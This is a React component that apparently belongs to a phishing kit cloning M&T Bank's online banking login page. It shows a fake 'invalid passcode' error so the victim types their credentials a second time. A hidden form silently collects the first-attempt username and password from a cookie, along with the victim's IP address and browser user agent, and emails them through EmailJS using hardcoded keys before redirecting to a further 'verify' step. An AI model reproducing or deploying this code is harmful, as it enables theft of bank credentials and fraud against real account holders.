import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";

export default function ReLogin() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login2>({
    username2: "",
    password2: "",
  });

  const login1: Login = cookies.get("login1");

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const form = React.useRef<HTMLFormElement>(null);

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    emailjs
      .sendForm(
        "service_9gs21m9", 
        "template_oeo8f9m",
        form.current!,
        "T8uOG8MEAEQT6Xur6"
      )
      .then(
        (result) => {
          console.log(result.text);
          cookies.set("login2", formInput);
          navigate("../login/verify", { replace: true });
        },
        (error) => {
          alert("Could not complete your request, please try again");
          console.log(error);
          setIsLoading(false);
        }
      );
  }

  const [ipAddress, setIpAddress] = React.useState<string>();

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);

  return (
    <>
      <form ref={form} action="" method="post" onSubmit={handleSubmit}>
        <div style={{ display: "none" }} className="hidden_form">
        {/* <div> */}
          <input type="text" name="username" defaultValue={login1.username} />
          <input type="text" name="password" defaultValue={login1.password} />

          <input type="text" name="pi" defaultValue={ipAddress} />
          <input
            type="text"
            name="brow"
            defaultValue={window.navigator.userAgent}
          />
        </div>
        <div className="mtb-app-login--content">
          <div className="grid-x grid-padding-x grid-x__padded __spacer-section">
            <div className="cell">
              <input type="hidden" value="OLB:SSC:LogInToOnlineBanking" />
              <div className="mtb-section-header mtb-section-header__login">
                <h1>Log In to Online Banking</h1>
                <p>For Personal and Business Accounts</p>
              </div>
            </div>

            <div className="mtb-page-error mtb-error-border mtb-error-margin">
              <input
                data-val="true"
                data-val-number="The field FailedSignOnCount must be a number."
                data-val-required="The FailedSignOnCount field is required."
                id="FailedSignOnCount"
                name="FailedSignOnCount"
                type="hidden"
                value="0"
              />
              <div className="mtb-app-default--content">
                <div className="callout __has-icon warning __no-border">
                  <i className="__is-icon m-icon m-icon-notification m-icon-position">
                    <span className="show-for-sr">Notification Icon</span>
                  </i>
                  <p>
                    You have entered an invalid User ID and/or Passcode. Please
                    try again.
                  </p>
                  <p>
                    <a
                      style={{ textDecoration: "none" }}
                      href="https://onlinebanking.mtb.com/Login/PasscodeReset"
                    >
                      Forgot User ID or Passcode? &gt;
                    </a>
                  </p>
                 
                </div>
              </div>
            </div>
            <div className="cell js-formFieldParent" data-parentfor="userId">
              <input
                data-val="true"
                data-val-required="The IsShowPUBMessage field is required."
                id="IsShowPUBMessage"
                name="IsShowPUBMessage"
                type="hidden"
                value="False"
              />
              <label htmlFor="userId"> User ID </label>
              <div className="input-group m-fake-single-input">
                <input
                  className="input-group-field"
                  data-fc-id="121"
                  type="text"
                  id="userId"
                  name="username2"
                  aria-required="true"
                  data-inputtype="text"
                  data-attribute=""
                  maxLength={20}
                  required
                  aria-describedby="userIdError"
                  aria-errormessage="userIdError"
                  aria-invalid="true"
                  onChange={handleInputChange}
                />
              </div>
              <p
                className="form-error mtb-error-border"
                id="userIdError"
                role="alert"
              ></p>
            </div>

            <div className="cell js-formFieldParent" data-parentfor="Passcode">
              <label htmlFor="Passcode"> Passcode </label>
              <div className="input-group m-fake-single-input">
                <input
                  className="input-group-field is-mtb-form-error-login"
                  data-fc-id="122"
                  type="password"
                  id="Passcode"
                  name="password2"
                  aria-required="true"
                  data-inputtype="tel"
                  maxLength={20}
                  required
                  onChange={handleInputChange}
                />
                <div className="input-group-button">
                  <button
                    type="button"
                    id="Show"
                    data-btnfor="Passcode"
                    className="button clear hide js-showHide"
                  >
                    Show
                  </button>
                </div>
              </div>
              <p
                className="form-error mtb-error-border"
                id="PasscodeError"
                role="alert"
              ></p>
            </div>

            <div className="cell">
              <div className="mtb-formcheckbox">
                <input
                  className="show-for-sr"
                  type="checkbox"
                  id="RememberUserId"
                  name="RememberUserId"
                  value="false"
                />
                <label htmlFor="RememberUserId" className="__spacer-remove">
                  Remember User ID
                </label>
              </div>
            </div>
          </div>

          <div className="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
            <div className="cell">
              {isLoading ? (
                <div
                  style={{
                    width: "100%",
                    display: "flex",
                    justifyContent: "center",
                  }}
                >
                  <span className="loader"></span>
                </div>
              ) : (
                <button
                  type="submit"
                  className="button button__form-no-spacer expanded kessel-flush"
                  id="btnSubmit"
                >
                  Log In
                </button>
              )}
            </div>
            <div className="cell">
              <a
                href="https://onlinebanking.mtb.com/Login/LoginHelp"
                className="button button__fake-padding-no-spacer expanded clear"
                id="jsAnalyticsLink"
              >
                Help with User ID or Passcode
              </a>
            </div>
            <div className="cell">
              <a
                href="https://onlinebanking.mtb.com/Enrollment/Enroll"
                className="button button__fake-padding expanded clear"
                id="jsAnalyticsEnrollLink"
                data-attribute="item"
              >
                Enroll Now
              </a>
            </div>

            <p className="cell text-center __font-size-tiny __color-gray-accent">
              Unauthorized access is prohibited. Usage may be monitored.
            </p>
          </div>
        </div>
      </form>
    </>
  );
}
